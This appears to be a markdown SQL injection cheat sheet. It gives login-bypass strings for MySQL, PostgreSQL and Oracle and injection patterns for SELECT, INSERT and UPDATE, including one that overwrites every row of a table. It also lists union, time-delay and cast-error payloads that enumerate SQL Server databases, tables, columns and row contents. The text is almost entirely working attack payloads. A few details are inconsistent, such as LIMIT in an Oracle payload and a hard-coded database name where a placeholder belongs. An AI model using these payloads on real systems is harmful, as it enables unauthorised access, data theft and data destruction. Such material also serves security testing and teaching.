# SQL injection

## Login bypass

### MySQL

```
' or 1=1;#
' or 1=1 LIMIT 1;#
```

### PostgreSQL

```
' or 1=1;--
' or 1=1;/*
' or 1=1 LIMIT 1;--
```

### Oracle

```
' or 1=1--
' or 1=1 LIMIT 1--
```

## Injection types

### SELECT

```
SELECT * FROM accounts WHERE user = 'xxx' AND pass = 'yyy'

xxx' OR 1=1;--            #hides the condition on pass field behind a comment
xxx' OR 1=1 LIMIT 1;--    #hides the extra quote with a comment and limits the results to 1 match (can avoid simple SQLi detections)
```

### INSERT

```
INSERT INTO accounts (user, pass, info) VALUES ('xxx', 'yyy', 'zzz');

xxx');<commands>;--    #close the open sets of quotes and brackets, hide the duplicates behind inline comment
```

### UPDATE

```
UPDATE accounts SET info='xxx' WHERE user = 'yyy';

xxx';<commands>;--    #DANGEROUS! Hides the WHERE clause, all info fields in table will be set to "xxx"
yyy';<commands>;--    #update statement completes normally, then the injected commands will be executed
```

## Data disclosure

### Union based data disclosure

1. Find the number of columns: `' or 1=1 order by <col number>; --` increase the number of columns until you get an error. Pay also attention to how the output is ordered, this allows you to match a column number to its output field.
2. Join data: `' or 1=1 union all select <fields> from <table>; --` since the UNION operation requires that both tables have the same column number, add NULL values for the missing columns in the select if the operation fails.

### Time based boolean check

Execute a query that results in a boolean statement (true/false). Use a time delay command to stop execution if the result is True. Useful to display boolean values since error based data disclosure doesn't work with them.

```
');if (IS_MEMBER ('db_owner') = 0) WAITFOR DELAY '0:0:5';--
```

### Error based data disclosure

If the field you're injecting is not used to display data it is possible to make the database print data by causing a cast error i.e. casting strings to integers. This allows you to read one value in a table at time, to print more values filter by row number.

```
'); select CAST(@@version as int);--
```

#### Print database list

```
');SELECT CAST (name AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS rownumber,name FROM master..sysdatabases) AS foo WHERE rownumber = <row>;--
```

#### Print tables in database

```
');SELECT CAST (name AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS rownumber,name FROM <db>..sysobjects WHERE xtype = 'U') AS foo WHERE rownumber = <row>;--
```

#### Enumerate columns

```
');SELECT CAST (foo.name AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY archive..syscolumns.name ASC) AS rownumber,<db>..syscolumns.name AS name FROM <db>..syscolumns, <db>..sysobjects WHERE <db>..syscolumns.id=<db>..sysobjects.id AND <db>..sysobjects.name='<table>') AS foo WHERE rownumber = <row>;--
```

#### Select data from column in nth row

Insert the columns you need to read in the inner select, in this way it wil be possible to select by row number and read the content of the column one row at time.

```
');SELECT CAST (foo.col1 AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY id ASC) AS rownumber,<db>..<table>.<column> AS col1 FROM <db>..<table>) AS foo WHERE rownumber = <nth>;--
```
